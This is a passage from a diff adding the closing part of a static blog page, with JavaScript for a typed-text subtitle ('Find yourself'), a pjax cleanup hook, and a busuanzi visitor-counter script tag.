+        sub.unshift(...extraContents)
+      }
+
+      if (typeof content === 'string') {
+        sub.unshift(content)
+      } else if (Array.isArray(content)) {
+        sub.unshift(...content)
+      }
+
+      sub.length > 0 && typedJSFn.init(sub)
+    } else {
+      document.getElementById('subtitle').textContent = typeof content === 'string' ? content :
+        (Array.isArray(content) && content.length > 0 ? content[0] : '')
+    }
+  }
+}
+btf.addGlobalFn('pjaxSendOnce', () => { typed.destroy() }, 'typedDestroy')
+</script><script>function subtitleType () {
+  typedJSFn.processSubtitle(["Find yourself"])
+}
+typedJSFn.run(subtitleType)</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
